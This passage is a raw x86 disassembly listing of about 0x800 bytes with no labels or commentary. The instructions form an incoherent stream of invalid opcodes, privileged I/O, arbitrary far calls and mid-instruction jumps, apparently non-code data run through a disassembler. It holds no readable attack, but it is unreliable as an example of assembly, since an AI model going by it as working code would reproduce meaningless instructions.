  4225ad:	jl     0x42257b
  4225af:	mov    cl,bh
  4225b1:	cmp    al,0x83
  4225b3:	sti    
  4225b4:	aas    
  4225b5:	out    dx,al
  4225b6:	ficomp WORD PTR [esi]
  4225b8:	std    
  4225b9:	xor    al,0x44
  4225bb:	scas   eax,DWORD PTR es:[edi]
  4225bc:	xchg   BYTE PTR [ebp+0x5087af90],al
  4225c2:	leave  
  4225c3:	sar    dh,cl
  4225c5:	sti    
  4225c6:	repnz mov dh,0xb2
  4225c9:	dec    edx
  4225ca:	loopne 0x422628
  4225cc:	sub    ch,bl
  4225ce:	in     al,0xee
  4225d0:	enter  0xdef1,0x76
  4225d4:	and    BYTE PTR [eax+0x954d0c0],0x4
  4225db:	test   eax,0x671b546e
  4225e0:	inc    edi
  4225e1:	(bad)  [ebp-0x7b]
  4225e4:	pop    ebp
  4225e5:	dec    ecx
  4225e6:	mov    esp,0x9ee28218
  4225eb:	inc    BYTE PTR [eax]
  4225ed:	and    ah,BYTE PTR [edi+0x38]
  4225f0:	xrelease lock sbb DWORD PTR [edi+eiz*4+0x1776c7ca],eax
  4225f9:	mov    ch,0x2f
  4225fb:	jns    0x422675
  4225fd:	jb     0x422639
  4225ff:	cwde   
  422600:	jle    0x42262a
  422602:	and    eax,0xdedcdc5d
  422607:	jmp    0x16eb:0x34c4de53
  42260e:	jns    0x4225d6
  422610:	or     eax,0xe2411e48
  422615:	rcl    BYTE PTR [esi-0x3406b440],cl
  42261b:	dec    edx
  42261c:	add    DWORD PTR [ebx-0x6],edi
  42261f:	je     0x4225e5
  422621:	nop
  422622:	sbb    eax,0x1a805cef
  422627:	aaa    
  422628:	mov    esp,0xd66849f7
  42262d:	ins    DWORD PTR es:[edi],dx
  42262e:	(bad)  
  42262f:	cmp    cl,BYTE PTR [ebp+edi*4-0x6035d93]
  422636:	daa    
  422637:	cmc    
  422638:	loope  0x4225e1
  42263a:	pop    edx
  42263b:	and    eax,0xf3cf8699
  422640:	jo     0x422657
  422642:	imul   edi,DWORD PTR [esi+eax*1-0x7d],0x5
  422647:	aas    
  422648:	lods   al,BYTE PTR ds:[esi]
  422649:	cdq    
  42264a:	pop    edi
  42264b:	inc    edx
  42264c:	test   DWORD PTR [ebx-0x12e03390],edx
  422652:	xor    DWORD PTR [esi-0x63],0xd007998d
  422659:	or     bl,BYTE PTR [esi]
  42265b:	inc    edx
  42265c:	fwait
  42265d:	imul   edi,edx,0x399c161
  422663:	call   FWORD PTR [edi+0x66]
  422666:	sub    ch,BYTE PTR [eax-0x402bfce3]
  42266c:	xor    eax,0xbd9f7e99
  422671:	in     eax,0xfb
  422673:	repnz sub al,0x75
  422676:	enter  0x5f44,0x38
  42267a:	sub    edi,DWORD PTR [ebx+0x3251d7d3]
  422680:	(bad)  
  422681:	adc    ebx,DWORD PTR [edx-0x19]
  422684:	jb     0x422695
  422686:	inc    ebp
  422687:	xor    eax,0x46ae26b9
  42268c:	lods   al,BYTE PTR ds:[esi]
  42268d:	ja     0x422681
  42268f:	inc    esp
  422690:	pop    ss
  422691:	add    DWORD PTR [esi-0x15677683],edx
  422697:	push   esi
  422698:	mov    ?,WORD PTR ds:0xa6d36d0
  42269e:	rol    DWORD PTR [esi],0x81
  4226a1:	scas   al,BYTE PTR es:[edi]
  4226a2:	frstor [ebx-0x428c8f54]
  4226a8:	push   ecx
  4226a9:	xor    BYTE PTR [eax+edx*1-0x2c79587c],bl
  4226b0:	aaa    
  4226b1:	rcr    DWORD PTR [eax],0x86
  4226b4:	mov    edi,0x444f6dc5
  4226b9:	and    BYTE PTR [esi-0x345c7fda],al
  4226bf:	sub    al,0x71
  4226c1:	ss fwait
  4226c3:	pop    esp
  4226c4:	mov    esi,0x1a0b4d86
  4226c9:	adc    eax,0x4029cb95
  4226ce:	int3   
  4226cf:	xor    BYTE PTR [ecx],al
  4226d1:	(bad)  [esi+0x67500363]
  4226d7:	add    BYTE PTR [esi-0x39],dh
  4226da:	mov    eax,ds:0x85c505cc
  4226df:	ficom  WORD PTR [ecx+0x185584b]
  4226e5:	and    BYTE PTR [ebx-0x64],bl
  4226e8:	dec    edx
  4226e9:	adc    al,0x1d
  4226eb:	push   es
  4226ec:	xchg   edi,eax
  4226ed:	sahf   
  4226ee:	sahf   
  4226ef:	dec    ebx
  4226f0:	fst    DWORD PTR [esi+0x4cb11cdd]
  4226f6:	add    eax,0x6bc4b182
  4226fb:	adc    BYTE PTR [edx+0x19],cl
  4226fe:	xchg   BYTE PTR [ebx-0x7da638d6],al
  422704:	bound  ebp,QWORD PTR [ecx-0x35]
  422707:	aad    0x83
  422709:	or     al,0xdc
  42270b:	test   DWORD PTR [eax+0x7d],ebp
  42270e:	xor    esp,ebx
  422710:	jmp    0x260d:0xf99c3044
  422717:	call   0xb201a3ca
  42271c:	xchg   ecx,eax
  42271d:	adc    ch,dl
  42271f:	iret   
  422720:	ret    0xc4e4
  422723:	jbe    0x4226a6
  422725:	xchg   edx,eax
  422726:	rol    BYTE PTR [edi+0x1d],cl
  422729:	xchg   edx,eax
  42272a:	jge    0x422757
  42272c:	shr    BYTE PTR [ebp-0x5f5a8819],0xe8
  422733:	test   BYTE PTR ds:0xa1f9900d,0x33
  42273a:	je     0x4226fc
  42273c:	hlt    
  42273d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42273e:	(bad)  
  42273f:	outs   dx,DWORD PTR ds:[esi]
  422740:	rol    DWORD PTR gs:0x149f9e1e,0x72
  422748:	les    ebp,FWORD PTR [ebx+0x637b2a4c]
  42274e:	je     0x42273c
  422750:	das    
  422751:	inc    edx
  422752:	sbb    al,0x8d
  422754:	lods   eax,DWORD PTR ds:[esi]
  422755:	push   ecx
  422756:	(bad)  
  422757:	fstp   QWORD PTR [edx]
  422759:	out    dx,eax
  42275a:	jmp    0x9f5a1723
  42275f:	test   DWORD PTR [edi-0x12],ebx
  422762:	push   ebp
  422763:	jg     0x422798
  422765:	xchg   DWORD PTR [edi],edx
  422767:	mov    cl,0x1d
  422769:	retf   
  42276a:	pop    ecx
  42276b:	dec    edx
  42276c:	inc    ecx
  42276d:	out    dx,al
  42276e:	mov    ecx,0x3237a02d
  422773:	adc    ecx,ebp
  422775:	and    BYTE PTR [eax-0x6b],ah
  422778:	mov    ds:0x4d5527ae,al
  42277d:	xor    bh,bh
  42277f:	adc    eax,0x19f8ba79
  422784:	jge    0x422739
  422786:	mov    ds:0x798e96f4,al
  42278b:	push   ss
  42278c:	(bad)  
  42278d:	call   0xf0b3:0xa07da29b
  422794:	int3   
  422795:	xor    al,0xc6
  422797:	test   BYTE PTR [ecx-0x28],bh
  42279a:	and    al,0xb6
  42279c:	sub    al,0x35
  42279e:	mov    edx,0xabef4966
  4227a3:	ins    DWORD PTR es:[edi],dx
  4227a4:	aaa    
  4227a5:	jmp    0x422817
  4227a7:	add    esi,ebp
  4227a9:	sti    
  4227aa:	sar    DWORD PTR [ebp-0x2a6ab953],1
  4227b0:	push   eax
  4227b1:	call   0xaa13:0xb76952b1
  4227b8:	ja     0x42277d
  4227ba:	les    eax,FWORD PTR [eax+0x74]
  4227bd:	fmul   DWORD PTR ds:0x170f2903
  4227c3:	leave  
  4227c4:	pop    esi
  4227c5:	in     eax,dx
  4227c6:	cmp    eax,0xe54773e6
  4227cb:	in     al,0x31
  4227cd:	and    eax,0x55b10190
  4227d2:	jb     0x4227ac
  4227d4:	popf   
  4227d5:	popf   
  4227d6:	lods   al,BYTE PTR ds:[esi]
  4227d7:	push   ecx
  4227d8:	jae    0x4227f7
  4227da:	test   BYTE PTR [edx+0x60],0x25
  4227de:	sub    ecx,DWORD PTR [ecx-0x2683bff7]
  4227e4:	mov    al,0x31
  4227e6:	push   ds
  4227e7:	fs ins DWORD PTR es:[edi],dx
  4227e9:	int    0x5a
  4227eb:	dec    esi
  4227ec:	jns    0x422837
  4227ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227ef:	ror    BYTE PTR [edx],0x7b
  4227f2:	fnsave ds:0x989bb4fa
  4227f8:	or     BYTE PTR [edx-0xc],cl
  4227fb:	or     DWORD PTR [edx+0x5c],esp
  4227fe:	ror    BYTE PTR [edx],1
  422800:	cld    
  422801:	jp     0x422829
  422803:	mov    eax,ds:0x58f1afdc
  422808:	pop    edi
  422809:	sbb    al,dl
  42280b:	mov    al,BYTE PTR [esi*8-0x4c7610c]
  422812:	xor    eax,0x3fd24423
  422817:	inc    esi
  422818:	loope  0x4227b4
  42281a:	out    0xc2,eax
  42281c:	into   
  42281d:	and    bh,BYTE PTR [edi]
  42281f:	mov    al,0xac
  422821:	inc    edx
  422822:	mov    eax,0x962d792a
  422827:	cmp    DWORD PTR [esi+0x38],edx
  42282a:	bound  ecx,QWORD PTR [ebx-0x24]
  42282d:	inc    esi
  42282e:	xchg   ebx,eax
  42282f:	imul   edi,ebx,0xffffffa7
  422832:	(bad)  
  422834:	stc    
  422835:	or     DWORD PTR [edx+0x3c33be6f],esi
  42283b:	shl    BYTE PTR [eax-0x542f3785],cl
  422841:	std    
  422842:	das    
  422843:	inc    esi
  422844:	pop    eax
  422845:	jne    0x42283c
  422847:	gs xor al,0x9f
  42284a:	push   edi
  42284b:	or     BYTE PTR [eax+0x19],dl
  42284e:	xchg   ebx,eax
  42284f:	stc    
  422850:	lahf   
  422851:	addr16 mov eax,ds:0xa5c
  422855:	jle    0x422893
  422857:	stc    
  422858:	fisttp WORD PTR [eax]
  42285a:	xor    BYTE PTR [edx+0xa],al
  42285d:	mov    edi,0xe559d6e0
  422862:	xchg   dl,al
  422864:	mov    eax,ds:0xc906171a
  422869:	mov    bh,0xe1
  42286b:	in     al,dx
  42286c:	repnz or esi,DWORD PTR [esi-0x25]
  422870:	pushf  
  422871:	mov    ds:0x6e6925c,eax
  422876:	jle    0x42289d
  422878:	xor    al,0xfa
  42287a:	js     0x422872
  42287c:	pop    edx
  42287d:	fnsave [eax-0xa]
  422880:	inc    edx
  422881:	xor    eax,0x4202ac9d
  422886:	jmp    0x49f81d0b
  42288b:	fwait
  42288c:	not    BYTE PTR [esi-0x1]
  42288f:	mov    ebx,0xe7e0d38d
  422894:	jmp    0x422889
  422896:	loop   0x4228f3
  422898:	stc    
  422899:	push   ebp
  42289a:	inc    edi
  42289b:	push   edi
  42289c:	and    eax,0x8e44a217
  4228a1:	dec    ebx
  4228a2:	add    al,0x39
  4228a4:	(bad)  [ebp-0x90d6d59]
  4228aa:	xor    al,BYTE PTR [edi+edi*1+0x24]
  4228ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228af:	sti    
  4228b0:	xchg   esp,eax
  4228b1:	nop
  4228b2:	push   ebp
  4228b3:	jl     0x42289d
  4228b5:	or     BYTE PTR [ebx],cl
  4228b7:	cmp    eax,0x20463fd4
  4228bc:	scas   al,BYTE PTR es:[edi]
  4228bd:	fwait
  4228be:	lods   eax,DWORD PTR ds:[esi]
  4228bf:	xbegin 0x4376b6fb
  4228c5:	les    esi,FWORD PTR [ebx]
  4228c7:	cs out 0xb1,al
  4228ca:	add    eax,0x689574f8
  4228cf:	fnstenv [ebp+0x26072884]
  4228d5:	inc    eax
  4228d6:	(bad)  
  4228d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228d8:	cmp    eax,DWORD PTR [ecx]
  4228da:	call   FWORD PTR [edi]
  4228dc:	pop    ecx
  4228dd:	test   DWORD PTR [edx+0x1f9cafb8],ebx
  4228e3:	daa    
  4228e4:	ret    0xa26
  4228e7:	add    BYTE PTR [edx-0x297cf691],0xa0
  4228ee:	and    DWORD PTR [esi-0x14],ebx
  4228f1:	pusha  
  4228f2:	add    al,0x9
  4228f4:	adc    ah,BYTE PTR [ebx+0x7f73d042]
  4228fa:	mov    ah,0x9f
  4228fc:	popf   
  4228fd:	xchg   ebp,eax
  4228fe:	dec    ebx
  4228ff:	ins    BYTE PTR es:[edi],dx
  422900:	jmp    0x7786:0x21d44f5a
  422907:	xchg   ebp,eax
  422908:	mov    ch,BYTE PTR [edx+0x76]
  42290b:	and    eax,DWORD PTR [ebx+ecx*8-0x3c]
  42290f:	ret    
  422910:	shl    BYTE PTR [edx],1
  422912:	fwait
  422913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422914:	jle    0x4228b4
  422916:	cld    
  422917:	pop    ds
  422918:	push   0xffffffb7
  42291a:	sub    al,0xe1
  42291c:	pop    edx
  42291d:	adc    bh,ah
  42291f:	ins    DWORD PTR es:[edi],dx
  422920:	sub    al,0x6f
  422922:	aas    
  422923:	mov    eax,0x7dab670
  422928:	and    BYTE PTR [eax],0xa9
  42292b:	call   0x909b:0xbfb33d79
  422932:	push   edi
  422933:	nop
  422934:	inc    esi
  422935:	xor    BYTE PTR [ecx-0xc],al
  422938:	aam    0x2f
  42293a:	pop    ss
  42293b:	jbe    0x4228db
  42293d:	add    al,0x47
  42293f:	nop
  422940:	and    ebp,DWORD PTR [edi+0x4d]
  422943:	push   0xffffffad
  422945:	pop    esp
  422946:	ss jmp 0x4229aa
  422949:	xor    al,0x35
  42294b:	push   es
  42294c:	push   ebp
  42294d:	ins    DWORD PTR es:[edi],dx
  42294e:	pop    edx
  42294f:	sub    bl,al
  422951:	inc    ebx
  422952:	int3   
  422953:	sub    eax,0xe655d63f
  422958:	or     eax,DWORD PTR [edi-0x4a34aaea]
  42295e:	pusha  
  42295f:	lods   eax,DWORD PTR ds:[esi]
  422960:	add    DWORD PTR [edi],edi
  422962:	dec    esp
  422963:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422964:	iret   
  422965:	push   es
  422966:	lods   eax,DWORD PTR ds:[esi]
  422967:	xchg   ecx,eax
  422968:	enter  0x7a5c,0x70
  42296c:	adc    ch,BYTE PTR [eax+edx*4]
  42296f:	pop    ecx
  422970:	xlat   BYTE PTR ds:[ebx]
  422971:	jmp    0x86746391
  422976:	push   ebp
  422977:	pop    edi
  422978:	adc    BYTE PTR [esi],ah
  42297a:	loop   0x42290f
  42297c:	add    BYTE PTR [esp+esi*4-0x3fbdfe6c],dh
  422983:	pop    ss
  422984:	xchg   ebx,eax
  422985:	std    
  422986:	rol    DWORD PTR [ebx-0x5098e13b],1
  42298c:	and    ecx,DWORD PTR [ecx+0x1d]
  42298f:	repz sub ecx,DWORD PTR [esi+edx*8]
  422993:	or     ebx,edx
  422995:	call   0xa8d0cc08
  42299a:	popf   
  42299b:	out    0x8c,al
  42299d:	xchg   esi,eax
  42299e:	jbe    0x422970
  4229a0:	mov    ebp,0x1ebc861b
  4229a5:	test   eax,0x7f24475a
  4229aa:	scas   eax,DWORD PTR es:[edi]
  4229ab:	repnz xor BYTE PTR [eax-0x280b3823],dl
  4229b2:	mov    fs,WORD PTR [edx-0x46]
  4229b5:	shl    DWORD PTR [edx+0x209d4df1],0xdc
  4229bc:	imul   ebx,ebx,0x9c8e70
  4229c2:	ret    
  4229c3:	pop    edx
  4229c4:	pop    ds
  4229c5:	xbegin 0x84177469
  4229cb:	or     esp,edx
  4229cd:	imul   eax,ebx,0x72
  4229d0:	rcr    BYTE PTR [ecx],0x59
  4229d3:	les    esp,FWORD PTR [edx-0x27]
  4229d6:	push   0x8a486e4d
  4229db:	jl     0x4229a0
  4229dd:	loop   0x422a25
  4229df:	push   cs
  4229e0:	push   0x630f9b36
  4229e5:	in     al,0xd4
  4229e7:	adc    eax,0xb10efe1d
  4229ed:	push   0xffffffe2
  4229ef:	out    0x7e,eax
  4229f1:	dec    ecx
  4229f2:	mov    esp,0x733d0e29
  4229f7:	adc    esp,edx
  4229f9:	xchg   DWORD PTR [edi-0x1f],esp
  4229fc:	int3   
  4229fd:	add    eax,0x8b56478
  422a02:	dec    ebx
  422a03:	mov    al,0xf5
  422a05:	mov    ah,0xb4
  422a07:	pop    ebp
  422a08:	mov    ebp,0x55e4efb
  422a0d:	mov    eax,DWORD PTR [ecx-0x786ca853]
  422a13:	pusha  
  422a14:	mov    eax,0xdc2fba49
  422a19:	or     DWORD PTR [ecx],esp
  422a1b:	call   0x6f82:0xef5702c1
  422a22:	ins    DWORD PTR es:[edi],dx
  422a23:	fcom   st(7)
  422a25:	ins    BYTE PTR es:[edi],dx
  422a26:	nop
  422a27:	jnp    0x4229c7
  422a29:	int3   
  422a2a:	jb     0x422a88
  422a2c:	xor    BYTE PTR [edx+esi*4-0x1d532964],0xf8
  422a34:	cmc    
  422a35:	xor    dh,cl
  422a37:	sbb    esp,DWORD PTR ds:0x38be1550
  422a3d:	jmp    0x7fdbca7c
  422a42:	hlt    
  422a43:	iret   
  422a44:	retf   0x93a2
  422a47:	sbb    BYTE PTR [esp+ebx*4+0x58d24759],cl
  422a4e:	or     edx,DWORD PTR [esp+esi*2]
  422a51:	mov    cl,0x36
  422a53:	int3   
  422a54:	cld    
  422a55:	sub    bh,cl
  422a57:	jl     0x422aa6
  422a59:	push   0x20
  422a5b:	clc    
  422a5c:	ss push ebx
  422a5e:	mov    eax,DWORD PTR ss:0xa8922bd6
  422a65:	rcl    BYTE PTR [edx],cl
  422a67:	push   edi
  422a68:	fisubr WORD PTR [eax+0xd]
  422a6b:	sti    
  422a6c:	call   0xd65881b6
  422a71:	in     eax,dx
  422a72:	sbb    DWORD PTR [edi-0x1bac3441],edi
  422a78:	xchg   esi,eax
  422a79:	shl    DWORD PTR [esi+0x4e683188],1
  422a7f:	adc    dh,BYTE PTR [edx-0x2adcc8a3]
  422a85:	test   BYTE PTR [ebx+ebx*1+0x58c66039],bl
  422a8c:	sub    al,0x74
  422a8e:	xor    ch,bl
  422a90:	jecxz  0x422a34
  422a92:	cmp    DWORD PTR [ebp+0x8608dc4],esp
  422a98:	repnz inc edx
  422a9a:	mov    ds:0xafb34718,al
  422a9f:	call   0xe489:0x73190e95
  422aa6:	or     BYTE PTR [edi+0x7e],0xa9
  422aaa:	push   edx
  422aab:	pop    es
  422aac:	fadd   st(3),st
  422aae:	jge    0x422b23
  422ab0:	add    ah,BYTE PTR [esi+0xe]
  422ab3:	stc    
  422ab4:	mov    ch,0x58
  422ab6:	dec    eax
  422ab7:	fcom   DWORD PTR [ebp+edx*4+0xebd2030]
  422abe:	fimul  DWORD PTR [ecx+edx*2-0xb9db74]
  422ac5:	sbb    eax,DWORD PTR [ebp+0x77]
  422ac8:	jge    0x422abc
  422aca:	or     dl,BYTE PTR [ecx-0x5bd6089]
  422ad0:	icebp  
  422ad1:	ins    BYTE PTR es:[edi],dx
  422ad2:	push   ds
  422ad3:	fist   WORD PTR [eax]
  422ad5:	(bad)  [eax]
  422ad7:	push   0x8b18ae4c
  422adc:	push   ss
  422add:	pop    eax
  422ade:	les    esi,FWORD PTR [ebp+ecx*8-0x565a9e07]
  422ae5:	cmp    al,0x8f
  422ae7:	leave  
  422ae8:	push   esp
  422ae9:	int    0xcc
  422aeb:	mov    eax,0xf14913bb
  422af0:	ins    DWORD PTR es:[edi],dx
  422af1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422af2:	pop    eax
  422af3:	leave  
  422af4:	inc    esi
  422af5:	ficom  DWORD PTR [ebx+esi*4]
  422af8:	mov    edx,0xcc095b13
  422afd:	jle    0x422ac4
  422aff:	cmp    eax,DWORD PTR [ecx-0x114a2144]
  422b05:	cmp    DWORD PTR [eax+0x6c],edi
  422b08:	cmp    DWORD PTR ds:0xd9f8b9a6,esp
  422b0f:	xchg   ebx,eax
  422b10:	cmp    eax,0xe5160656
  422b15:	sbb    ebp,ebx
  422b17:	push   edx
  422b18:	and    al,cl
  422b1a:	sub    BYTE PTR [eax],0xa1
  422b1d:	(bad)  
  422b1e:	xchg   esp,eax
  422b1f:	push   edi
  422b20:	inc    eax
  422b21:	inc    esi
  422b22:	fwait
  422b23:	ins    DWORD PTR es:[edi],dx
  422b24:	call   0x1c2e918b
  422b29:	add    al,0xe1
  422b2b:	or     esi,DWORD PTR [ebp+0x22]
  422b2e:	pop    es
  422b2f:	sbb    al,0xc5
  422b31:	mul    esi
  422b33:	push   edx
  422b34:	inc    esp
  422b35:	dec    ebp
  422b36:	push   0xddd2ee85
  422b3b:	mov    ch,0xab
  422b3d:	ffree  st(2)
  422b3f:	sub    DWORD PTR [ebp+0x2e],eax
  422b42:	int3   
  422b43:	addr16 mov al,ds:0x80d4
  422b47:	je     0x422b74
  422b49:	add    DWORD PTR ds:0x2e2b5251,ebp
  422b4f:	inc    edx
  422b50:	gs cdq 
  422b52:	and    cl,dh
  422b54:	out    dx,eax
  422b55:	dec    edi
  422b56:	scas   eax,DWORD PTR es:[edi]
  422b57:	sub    ebx,DWORD PTR [ecx+0x7a]
  422b5a:	push   ecx
  422b5b:	adc    esp,DWORD PTR [ebx]
  422b5d:	test   BYTE PTR [esi],0x3b
  422b60:	push   cs
  422b61:	loop   0x422b3e
  422b63:	pop    edi
  422b64:	out    0x37,al
  422b66:	repz push eax
  422b68:	out    0xfb,al
  422b6a:	das    
  422b6b:	sub    al,0xaa
  422b6d:	rol    BYTE PTR [ecx-0x5fc5b4],cl
  422b73:	pop    edi
  422b74:	adc    DWORD PTR [ecx],edx
  422b76:	test   dh,0xfa
  422b79:	(bad)  
  422b7a:	js     0x422bf4
  422b7c:	jmp    0x422b61
  422b7e:	cmp    bh,BYTE PTR [ecx]
  422b80:	nop
  422b81:	and    dh,BYTE PTR [edi+0x7815148f]
  422b87:	mov    esi,0x93d0a6f7
  422b8c:	dec    esi
  422b8d:	push   0xfffffffd
  422b8f:	inc    esp
  422b90:	adc    bh,bl
  422b92:	arpl   cx,di
  422b94:	push   ds
  422b95:	pop    ebx
  422b96:	jp     0x422bc0
  422b98:	ins    BYTE PTR es:[edi],dx
  422b99:	fistp  WORD PTR [esp+eax*8+0x4e]
  422b9d:	push   cs
  422b9e:	mov    BYTE PTR [esi],0x8
  422ba1:	pop    esi
  422ba2:	jmp    0x99ada2fc
  422ba7:	enter  0xc48a,0x8d
  422bab:	pop    ebx
  422bac:	mov    cl,0x41
  422bae:	adc    eax,0x219b4df3
  422bb3:	and    al,0xdd
  422bb5:	(bad)  
  422bb6:	xchg   edi,eax
  422bb7:	push   es
  422bb8:	sub    edx,ebx
  422bba:	xor    al,0x40
  422bbc:	jae    0x422b54
  422bbe:	js     0x422bb3
  422bc0:	jg     0x422c36
  422bc2:	inc    edx
  422bc3:	test   BYTE PTR gs:[esi-0x3],dl
  422bc7:	retf   
  422bc8:	dec    eax
  422bc9:	mov    ecx,0x93452ff2
  422bce:	les    eax,FWORD PTR [eax-0x4]
  422bd1:	fwait
  422bd2:	mov    al,BYTE PTR [ebx+0x2e]
  422bd5:	push   eax
  422bd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bd7:	fcomp  QWORD PTR [eax]
  422bd9:	mov    ebx,0x533fb7aa
  422bde:	sahf   
  422bdf:	push   0xfffffffd
  422be1:	arpl   WORD PTR [ebx-0x4e7f532d],bp
  422be7:	pop    ss
  422be8:	sbb    ah,al
  422bea:	cld    
  422beb:	inc    edi
  422bec:	mov    bl,0x71
  422bee:	gs xchg esp,eax
  422bf0:	cmp    dl,bh
  422bf2:	and    ah,BYTE PTR [esp+eiz*2+0x40]
  422bf6:	adc    DWORD PTR ds:[ecx-0x44],esp
  422bfa:	jl     0x422bb8
  422bfc:	adc    DWORD PTR [edx],edx
  422bfe:	add    al,0xb5
  422c00:	out    0xed,al
  422c02:	call   0xafd1:0xb13c4538
  422c09:	pop    ebp
  422c0a:	dec    ebp
  422c0b:	xchg   edx,eax
  422c0c:	mov    al,0x1f
  422c0e:	pop    ecx
  422c0f:	adc    al,0xf7
  422c11:	repnz loope 0x422bfb
  422c14:	addr16 bswap eax
  422c17:	add    al,0xa7
  422c19:	je     0x422c40
  422c1b:	out    dx,al
  422c1c:	call   0xb7f9:0x9827d39c
  422c23:	inc    edi
  422c24:	pop    edi
  422c25:	pop    eax
  422c26:	adc    dl,bl
  422c28:	popf   
  422c29:	fsub   DWORD PTR ds:[esi-0x2f12b30a]
  422c30:	gs iret 
  422c32:	xchg   esi,eax
  422c33:	jae    0x422bcc
  422c35:	cmp    eax,0x2ee42282
  422c3a:	lock mov ebx,0xcddbf904
  422c40:	iret   
  422c41:	ret    0xbd3f
  422c44:	push   esi
  422c45:	push   ecx
  422c46:	ss (bad) 
  422c48:	iret   
  422c49:	or     edi,edi
  422c4b:	dec    ebx
  422c4c:	xor    eax,0x964774f0
  422c51:	inc    edx
  422c52:	fbstp  TBYTE PTR [edi-0x22]
  422c55:	xchg   DWORD PTR [eax-0x1c6708e4],edi
  422c5b:	popf   
  422c5c:	imul   ebx,DWORD PTR [eax+0x28],0x9
  422c60:	shl    DWORD PTR [edx],0xa7
  422c63:	inc    edi
  422c64:	push   ds
  422c65:	outs   dx,DWORD PTR ds:[esi]
  422c66:	ds mov dh,0xd2
  422c69:	jmp    0xb5a33bb1
  422c6e:	mov    es,WORD PTR [esi-0x2b9eca8a]
  422c74:	repz mov WORD PTR [edi-0x20],ds
  422c78:	inc    edi
  422c79:	pop    ebp
  422c7a:	ret    
  422c7b:	out    0x94,al
  422c7d:	sbb    al,0x10
  422c7f:	cmp    ebp,DWORD PTR [edi]
  422c81:	xchg   DWORD PTR [eax-0x4f],eax
  422c84:	add    al,0xa4
  422c86:	sub    eax,0x7deeb0d7
  422c8b:	pop    ds
  422c8c:	dec    edx
  422c8d:	xor    DWORD PTR [ebx-0x5691a8c7],0x44
  422c94:	leave  
  422c95:	ds icebp 
  422c97:	(bad)  
  422c98:	aaa    
  422c99:	ret    0x4254
  422c9c:	sbb    DWORD PTR [ecx-0x2bd8e493],edx
  422ca2:	add    al,0x2
  422ca4:	and    ebp,0x82e57454
  422caa:	xor    ch,BYTE PTR [ecx-0x1cdd0a14]
  422cb0:	test   BYTE PTR [eax-0x59d1fb82],0xd5
  422cb7:	jp     0x422c8a
  422cb9:	inc    esp
  422cba:	push   ds
  422cbb:	dec    eax
  422cbc:	ret    0xc502
  422cbf:	js     0x422c42
  422cc1:	out    0xa7,eax
  422cc3:	push   ebp
  422cc4:	les    ecx,FWORD PTR [edx]
  422cc6:	dec    ebp
  422cc7:	je     0x422cf0
  422cc9:	mov    bl,0x6a
  422ccb:	add    al,0x20
  422ccd:	call   0xbb9b:0x3f538c4a
  422cd4:	xchg   esi,eax
  422cd5:	inc    eax
  422cd6:	jae    0x422cb7
  422cd8:	jmp    ebx
  422cda:	js     0x422d50
  422cdc:	xchg   ebx,eax
  422cdd:	or     DWORD PTR [esi+eiz*4],edi
  422ce0:	sbb    BYTE PTR [edx+ebx*8+0x17],dl
  422ce4:	out    dx,eax
  422ce5:	cmp    DWORD PTR [ebp-0x34],ebx
  422ce8:	add    eax,0xb1d7374a
  422ced:	in     eax,0x45
  422cef:	cwde   
  422cf0:	mov    ecx,0xa73206e1
  422cf5:	cmc    
  422cf6:	(bad)  
  422cf7:	int3   
  422cf8:	ins    BYTE PTR es:[edi],dx
  422cf9:	icebp  
  422cfa:	out    0x1f,al
  422cfc:	out    dx,al
  422cfd:	push   ecx
  422cfe:	ss mov ebp,0x4b01b930
  422d04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d05:	xor    al,0xe9
  422d07:	dec    ebp
  422d08:	xchg   edx,eax
  422d09:	imul   ebp,DWORD PTR ds:0x5bf31c87,0xffffffdd
  422d10:	lock jp 0x422d15
  422d13:	jne    0x422d33
  422d15:	mov    BYTE PTR ds:0xa187f471,ch
  422d1b:	add    dh,BYTE PTR [edx-0x17]
  422d1e:	cmp    ch,ah
  422d20:	dec    edi
  422d21:	sbb    al,0xe6
  422d23:	into   
  422d24:	mov    eax,0x649b870
  422d29:	xor    al,0xe6
  422d2b:	push   ds
  422d2c:	lods   al,BYTE PTR ds:[esi]
  422d2d:	xchg   edi,eax
  422d2e:	shl    BYTE PTR ds:0xbab99635,0x94
  422d35:	inc    esi
  422d36:	int3   
  422d37:	mov    bh,BYTE PTR [eax-0x29fc41ac]
  422d3d:	adc    BYTE PTR [ebp+ecx*2-0x4b],dh
  422d41:	mov    ds:0x6511eea9,eax
  422d46:	cs hlt 
  422d48:	ins    BYTE PTR es:[edi],dx
  422d49:	adc    al,0x7a
  422d4b:	ret    0x338a
  422d4e:	push   0xe5748ca9
  422d53:	loopne 0x422cf8
  422d55:	retf   
  422d56:	jl     0x422d1c
  422d58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d59:	inc    edx
  422d5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d5b:	mov    al,0x9e
  422d5d:	(bad)
  422d60:	xchg   ebx,eax
  422d61:	mov    eax,ds:0x2c1d10f2
  422d66:	push   eax
  422d67:	mov    ds:0xa0beb663,al
  422d6c:	xor    DWORD PTR [ebx],ecx
  422d6e:	pop    eax
  422d6f:	mov    ecx,0x20a8225c
  422d74:	std    
  422d75:	fistp  QWORD PTR [ecx-0x1ea00020]
  422d7b:	cmp    DWORD PTR [ebp-0x48e12acb],edx
  422d81:	inc    ebx
  422d82:	loope  0x422d83
  422d84:	inc    esp
  422d85:	lahf   
  422d86:	push   esp
  422d87:	push   esi
  422d88:	push   ebp
  422d89:	adc    bl,BYTE PTR [edx+eax*4-0x2b]
  422d8d:	inc    edi
  422d8e:	leave  
  422d8f:	jl     0x422d84
  422d91:	lods   eax,DWORD PTR ds:[esi]
  422d92:	aaa    
  422d93:	sbb    DWORD PTR [ebx],eax
  422d95:	add    eax,0x665960d2
  422d9a:	pop    ebx
  422d9b:	in     al,dx
  422d9c:	scas   al,BYTE PTR es:[edi]
  422d9d:	retf   0x8f59
  422da0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422da1:	xchg   ch,ah
  422da3:	push   ss
  422da4:	push   eax
